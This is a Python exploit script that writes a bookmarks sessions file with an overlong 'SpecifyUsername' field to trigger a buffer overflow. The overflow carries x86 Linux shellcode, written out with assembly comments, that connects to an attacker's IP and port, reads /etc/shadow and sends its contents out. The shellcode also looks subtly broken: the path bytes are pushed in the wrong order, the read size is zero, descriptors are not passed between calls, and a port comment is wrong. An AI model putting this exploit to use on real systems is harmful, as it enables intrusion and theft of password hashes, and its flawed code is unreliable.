#!/usr/bin/env python

# Linux x86 shellcode to read /etc/shadow and send via TCP
shellcode = (
    # Socket setup (TCP)
    "\x6a\x66"          # push $0x66 (socketcall)
    "\x58"              # pop %eax
    "\x6a\x01"          # push $0x1 (sys_socket)
    "\x5b"              # pop %ebx
    "\x6a\x02"          # push $0x2 (AF_INET)
    "\x52"              # push %edx
    "\x6a\x01"          # push $0x1 (SOCK_STREAM)
    "\x6a\x02"          # push $0x2
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80

    # Connect to attacker's IP/port
    "\x6a\x66"          # push $0x66 (socketcall)
    "\x58"              # pop %eax
    "\x6a\x03"          # push $0x3 (sys_connect)
    "\x5b"              # pop %ebx
    "\x68\x12\x34\x56\x78"  # push attacker's IP (e.g., 0x78563412)
    "\x66\x68\x7a\x69"  # push attacker's port (e.g., 0x697a = 31337)
    "\x66\x6a\x02"      # push $0x2 (AF_INET)
    "\x89\xe1"          # mov %esp,%ecx
    "\x6a\x10"          # push $0x10 (sockaddr size)
    "\x51"              # push %ecx
    "\x52"              # push %edx
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80

    # Read /etc/shadow
    "\x6a\x05"          # push $0x5 (sys_open)
    "\x58"              # pop %eax
    "\x68\x2f\x73\x68\x61"  # push "/sha"
    "\x68\x64\x6f\x77\x2f"  # push "dow/"
    "\x68\x2f\x65\x74\x63"  # push "/etc"
    "\x89\xe3"          # mov %esp,%ebx
    "\x52"              # push %edx
    "\x6a\x00"          # push $0x0 (O_RDONLY)
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80

    # Read file contents
    "\x6a\x03"          # push $0x3 (sys_read)
    "\x58"              # pop %eax
    "\x52"              # push %edx
    "\x68\x10\x00\x00\x00"  # push buffer address (e.g., 0x10000000)
    "\x68\x00\x00\x00\x00"  # push buffer size (e.g., 0x100)
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80

    # Send data over socket
    "\x6a\x66"          # push $0x66 (socketcall)
    "\x58"              # pop %eax
    "\x6a\x04"          # push $0x4 (sys_send)
    "\x5b"              # pop %ebx
    "\x52"              # push %edx
    "\x68\x10\x00\x00\x00"  # push buffer address
    "\x68\x00\x00\x00\x00"  # push buffer size
    "\x89\xe1"          # mov %esp,%ecx
    "\xcd\x80"          # int $0x80

    # Exit
    "\x6a\x01"          # push $0x1 (sys_exit)
    "\x58"              # pop %eax
    "\xcd\x80"          # int $0x80
)

sessions_file = "[Bookmarks]\n"
sessions_file += "SpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode
